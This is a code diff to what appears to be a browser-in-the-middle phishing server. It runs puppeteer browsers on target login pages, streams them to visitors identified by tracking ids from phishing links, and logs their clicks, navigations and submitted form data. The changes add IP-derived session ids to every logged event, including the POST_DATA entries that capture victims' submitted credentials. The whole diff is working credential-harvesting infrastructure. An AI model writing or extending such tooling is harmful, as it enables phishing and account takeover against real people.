@@ -2,6 +2,7 @@ import fs from 'fs'
 import path from 'path'
 const __dirname = path.resolve()
 import got from 'got'
+import crypto from 'crypto'
 import Fastify from 'fastify'
 import fastify_io from 'fastify-socket.io'
 import puppeteer from 'puppeteer-extra'
@@ -36,6 +37,11 @@ try {
   }
 } catch (err) {
   //console.error(err)
+}
+
+// Generate session_id from IP using SHA256 (matching client-side pinpo.html)
+const generateSessionId = function(ip) {
+  return crypto.createHash('sha256').update(ip).digest('hex')
 }
 
 var ship_logs = function (log_data) {
@@ -125,9 +131,10 @@ fastify.route({
     }
     let client_ip = req.headers['x-real-ip']
     let tracking_id = pm ? pm.tracking_id : 'tracking_id'
-    let target_id = req.query[tracking_id] ? req.query[tracking_id] : "unknown"
+    let target_id = req.query[tracking_id] ? req.query[tracking_id] : crypto.randomBytes(8).toString('hex')
     if (pm) {
-      ship_logs({ "event_ip": client_ip, "target": target_id, "event_type": "CLICK", "event_data": req.url })
+      const session_id = generateSessionId(client_ip)
+      ship_logs({ "session_id": session_id, "event_ip": client_ip, "target": target_id, "event_type": "CLICK", "event_data": req.url })
     }
     console.log('client_ip: ' + client_ip)
     //if(config.admin_ips.includes(client_ip)){
@@ -342,7 +349,7 @@ async function get_browser(target_page) {
       if (pm && browser.user_ip != '') {
         let post_url_search = new RegExp(`${pm.post_url_search}`, "i");
         if (post_url_search.test(request.url())) {
-          ship_logs({ "event_ip": browser.user_ip, "target": browser.user_target_id, "event_type": "POST_DATA", "event_data": request.postData() })
+          ship_logs({ "session_id": browser.session_id, "event_ip": browser.user_ip, "target": browser.user_target_id, "event_type": "POST_DATA", "event_data": request.postData() })
           //          console.log(request.postData())
         }
       }
@@ -410,6 +417,7 @@ fastify.ready(async function (err) {
         empty_fescarbowl.user_target_id = request.target_id
         empty_fescarbowl.user_width = request.viewport_width
         empty_fescarbowl.user_height = request.viewport_height
+        empty_fescarbowl.session_id = request.session_id
         await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
         await empty_fescarbowl.target_page.setViewport({ width: request.viewport_width, height: request.viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
 
@@ -423,6 +431,10 @@ fastify.ready(async function (err) {
         empty_fescarbowl.user_socket = request.socket_id
         // Start this user with control of the assigned browser instance.
         empty_fescarbowl.controller_socket = request.socket_id
+        // Send session_id to broadcast.html
+        if (empty_fescarbowl.socket_id) {
+          fastify.io.to(empty_fescarbowl.socket_id).emit('set_session_id', empty_fescarbowl.session_id)
+        }
         fastify.io.to(empty_fescarbowl.socket_id).emit('stream_video_to_first_viewer', request.socket_id)
 
         empty_fescarbowl = await get_browser(target.login_page)
@@ -476,14 +488,15 @@ fastify.ready(async function (err) {
         browser.frameNavigationListenerAttached = true
         browser.target_page.on('framenavigated', async function (frame) {
           if (frame.parentFrame() === null) {
-            const pageUrl = frame.url()
-            const pageTitle = await browser.target_page.title().catch(() => 'Unknown')
+            const pageUrl = frame.url() || 'about:blank'
+            const pageTitle = (await browser.target_page.title().catch(() => null)) || '(sin título)'
             
             if (browser.controller_socket !== undefined) {
               fastify.io.to(browser.controller_socket).emit('push_state', pageUrl.split('/').slice(3).join('/'))
             }
             if (pm && browser.user_ip !== '') {
               ship_logs({ 
+                "session_id": browser.session_id,
                 "event_ip": browser.user_ip, 
                 "target": browser.user_target_id, 
                 "event_type": "NAVIGATION", 
@@ -496,7 +509,7 @@ fastify.ready(async function (err) {
         })
       }
     })
-    socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id) {
+    socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id, session_id) {
       // Remove pending duplicates for the same socket and keep the latest viewport.
       for (let i = pendingFescarAssignments.length - 1; i >= 0; i -= 1) {
         if (pendingFescarAssignments[i].socket_id === socket.id) {
@@ -508,7 +521,8 @@ fastify.ready(async function (err) {
         viewport_width,
         viewport_height,
         client_ip,
-        target_id
+        target_id,
+        session_id
       })
       processPendingFescarAssignments().catch((err) => {
         console.error(`new_fescar: queue processor failed: ${err.message}`)
